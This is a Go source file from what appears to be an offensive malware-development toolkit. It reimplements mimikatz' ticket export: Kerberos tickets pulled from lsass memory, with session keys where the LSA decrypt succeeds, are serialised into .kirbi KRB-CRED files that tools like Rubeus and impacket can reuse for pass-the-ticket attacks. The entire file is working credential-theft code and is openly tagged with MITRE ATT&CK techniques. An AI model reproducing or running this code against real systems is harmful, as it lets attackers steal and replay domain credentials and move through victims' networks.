package sekurlsa

import (
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"time"

	"github.com/jcmturner/gofork/encoding/asn1"

	"github.com/oioio-space/maldev/internal/krb5/iana/msgtype"
	"github.com/oioio-space/maldev/internal/krb5/iana/nametype"
	"github.com/oioio-space/maldev/internal/krb5/messages"
	"github.com/oioio-space/maldev/internal/krb5/types"
)

// Kirbi export — wraps a KerberosTicket extracted from lsass into the
// .kirbi (KRB-CRED) format produced by mimikatz' `sekurlsa::tickets
// /export`. The output bytes are an APPLICATION 22 SEQUENCE that
// downstream Kerberos tooling (Rubeus describe, impacket
// ticketConverter, gettgtpkinit) can parse.
//
// Encryption: emits an UNENCRYPTED EncKrbCredPart (etype 0,
// cipher = DER(EncKrbCredPart)). Mimikatz uses the same convention
// for its export path so the resulting .kirbi files are immediately
// readable by the same downstream tools without needing the
// originating session key. Replay (reusing the ticket against a real
// service) requires the session key, populated by the walker when
// SessionKey is non-empty (KIWI_KERBEROS_INTERNAL_TICKET embedded
// EncryptionKey + LSA decrypt).
//
// MITRE ATT&CK: T1558.003 (Kerberoasting / Use Alternate
// Authentication Material — Pass the Ticket export side).

// ErrKirbiInvalidTicket is returned when ToKirbi can't build a valid
// KRB-CRED — e.g., the ticket Buffer is empty or doesn't decode as an
// APPLICATION-tagged Ticket.
var ErrKirbiInvalidTicket = errors.New("sekurlsa: cannot export ticket to kirbi")

// ToKirbi serializes t into a KRB-CRED (.kirbi) byte slice. Returns
// ErrKirbiInvalidTicket if the underlying ASN.1 Ticket bytes are
// missing or malformed.
//
// The KRB-CRED carries a single Ticket (the one in t.Buffer) plus an
// unencrypted EncKrbCredPart describing the ticket's metadata
// (realms, principal names, flags, ticket lifetime). Tools that only
// describe the ticket (Rubeus describe, impacket describeTicket)
// always work; tools that need the session key for replay require
// SessionKey to be non-empty.
func (t *KerberosTicket) ToKirbi() ([]byte, error) {
	if len(t.Buffer) == 0 {
		return nil, fmt.Errorf("%w: empty Buffer", ErrKirbiInvalidTicket)
	}

	// Round-trip the raw bytes through messages.Ticket to validate
	// they're a properly-tagged APPLICATION 1 SEQUENCE — better to
	// fail here than to ship a kirbi that no parser will accept.
	var ticket messages.Ticket
	if err := ticket.Unmarshal(t.Buffer); err != nil {
		return nil, fmt.Errorf("%w: ticket Buffer is not a valid APPLICATION 1 Ticket: %v",
			ErrKirbiInvalidTicket, err)
	}

	// Build the KrbCredInfo block from whatever metadata we have.
	// Key field is REQUIRED in the ASN.1 schema; an empty KeyValue
	// keeps the byte-shape valid (OCTET STRING of zero length) while
	// signalling "session key not extracted" to downstream tools.
	clientPrincipal, clientRealm := splitClientName(t.ClientName)
	servicePrincipal := splitServiceName(t.ServiceName)
	serviceRealm := normalizeRealm(t.TargetName)

	// SessionKey is populated by the walker when the build's
	// KerberosLayout registers TicketSessionKey* offsets and the LSA
	// decrypt succeeds. When empty, we still emit a valid kirbi but
	// downstream tools can only describe (not replay) the ticket.
	keyValue := t.SessionKey
	if keyValue == nil {
		keyValue = []byte{}
	}
	info := messages.KrbCredInfo{
		Key: types.EncryptionKey{
			KeyType:  int32(t.KeyType),
			KeyValue: keyValue,
		},
		PRealm: clientRealm,
		PName: types.PrincipalName{
			NameType:   nametype.KRB_NT_PRINCIPAL,
			NameString: clientPrincipal,
		},
		Flags:  flagsToBitString(t.Flags),
		SRealm: serviceRealm,
		SName: types.PrincipalName{
			NameType:   nametype.KRB_NT_SRV_INST,
			NameString: servicePrincipal,
		},
	}

	// EncKrbCredPart wraps a SEQUENCE OF KrbCredInfo. We only carry
	// one ticket per .kirbi (mimikatz convention).
	enc := messages.EncKrbCredPart{
		TicketInfo: []messages.KrbCredInfo{info},
	}
	encBytes, err := enc.Marshal()
	if err != nil {
		return nil, fmt.Errorf("marshal EncKrbCredPart: %w", err)
	}

	cred := messages.KRBCred{
		PVNO:    pvnoKerberosV5,
		MsgType: msgtype.KRB_CRED,
		Tickets: []messages.Ticket{ticket},
		EncPart: types.EncryptedData{
			EType:  0, // unencrypted convention — cipher is plaintext DER
			Cipher: encBytes,
		},
	}
	return cred.Marshal()
}

// ToKirbiFile writes the KRB-CRED bytes to disk under dir, returning
// the full path of the created file. The filename mirrors mimikatz'
// `[krbtgt|TGS]-CLIENT@DOMAIN_to_SERVICE@DOMAIN.kirbi` shape but
// sanitized so it lands cleanly on every filesystem (no '/', '\',
// ':' — replaced with '_'). When dir is empty the file lands in the
// current working directory.
func (t *KerberosTicket) ToKirbiFile(dir string) (string, error) {
	data, err := t.ToKirbi()
	if err != nil {
		return "", err
	}
	name := kirbiFilename(t)
	path := filepath.Join(dir, name)
	if err := os.WriteFile(path, data, 0600); err != nil {
		return "", fmt.Errorf("write %s: %w", path, err)
	}
	return path, nil
}

// pvnoKerberosV5 is the protocol version field for every modern
// Kerberos message. RFC 4120 fixes it at 5.
const pvnoKerberosV5 = 5

// splitClientName parses "user@REALM" or "REALM\user" or just
// "user" forms. Returns ([]nameStrings, realm). Empty when
// ClientName is empty.
func splitClientName(s string) ([]string, string) {
	if s == "" {
		return []string{""}, ""
	}
	if i := strings.LastIndex(s, "@"); i > 0 {
		return strings.Split(s[:i], "/"), s[i+1:]
	}
	if i := strings.LastIndex(s, `\`); i > 0 {
		return strings.Split(s[i+1:], "/"), s[:i]
	}
	return strings.Split(s, "/"), ""
}

// splitServiceName splits an SPN like "krbtgt/CORP.LOCAL" into its
// component name array. Single names ("krbtgt") become a one-element
// slice. "krbtgt/CORP@FOREST" strips the "@FOREST" tail (the realm
// is recorded separately in SRealm).
func splitServiceName(s string) []string {
	if s == "" {
		return []string{""}
	}
	if i := strings.LastIndex(s, "@"); i > 0 {
		s = s[:i]
	}
	return strings.Split(s, "/")
}

// normalizeRealm strips the leading "@" mimikatz sometimes prepends
// and uppercases the realm to match the Kerberos convention.
func normalizeRealm(s string) string {
	s = strings.TrimPrefix(s, "@")
	return strings.ToUpper(s)
}

// flagsToBitString packs a 32-bit Kerberos ticket flags word into the
// asn1.BitString shape expected by KrbCredInfo.Flags. The encoding
// is big-endian and exactly 32 bits wide — RFC 4120 section 5.3.
func flagsToBitString(flags uint32) asn1.BitString {
	bs := asn1.BitString{
		Bytes: []byte{
			byte(flags >> 24),
			byte(flags >> 16),
			byte(flags >> 8),
			byte(flags),
		},
		BitLength: 32,
	}
	return bs
}

// kirbiFilenameSafe replaces every character that's invalid in any
// modern filesystem (Windows/POSIX union) with '_'.
var kirbiFilenameSafe = regexp.MustCompile(`[\\/:*?"<>|@]+`)

// kirbiFilename builds a mimikatz-compatible-ish filename: a 4-digit
// timestamp prefix (avoids collisions when exporting many tickets)
// + the ticket's service/client tuple + ".kirbi".
func kirbiFilename(t *KerberosTicket) string {
	prefix := "TGS"
	if isTGT(t) {
		prefix = "TGT"
	}
	client := t.ClientName
	if client == "" {
		client = "unknown"
	}
	service := t.ServiceName
	if t.TargetName != "" && t.TargetName != "@" {
		service += "_" + strings.TrimPrefix(t.TargetName, "@")
	}
	if service == "" {
		service = "unknown"
	}
	stamp := time.Now().UTC().Format("150405.000")
	stamp = strings.ReplaceAll(stamp, ".", "")
	raw := fmt.Sprintf("%s_%s_%s_to_%s.kirbi", stamp, prefix, client, service)
	return kirbiFilenameSafe.ReplaceAllString(raw, "_")
}

// isTGT returns true when the ticket is a TGT (service principal
// "krbtgt"). Case-insensitive — Microsoft sometimes records
// "Krbtgt" / "KRBTGT".
func isTGT(t *KerberosTicket) bool {
	return strings.EqualFold(t.ServiceName, "krbtgt")
}
